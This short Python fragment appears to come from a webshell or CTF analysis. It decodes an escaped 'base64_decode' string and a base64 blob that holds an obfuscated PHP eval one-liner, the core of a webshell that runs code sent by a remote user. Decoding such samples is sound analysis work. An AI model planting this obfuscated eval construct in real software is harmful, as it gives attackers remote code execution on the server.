...
aa = 'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7'
aaa = '\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65'

# eval($aaa($aa))
aaa_decode = aaa.split('\\')
print(aaa_decode[0])

# eval(base64_decode(aa))
aa_decode = base64.b64decode(aa)
print(aa_decode)
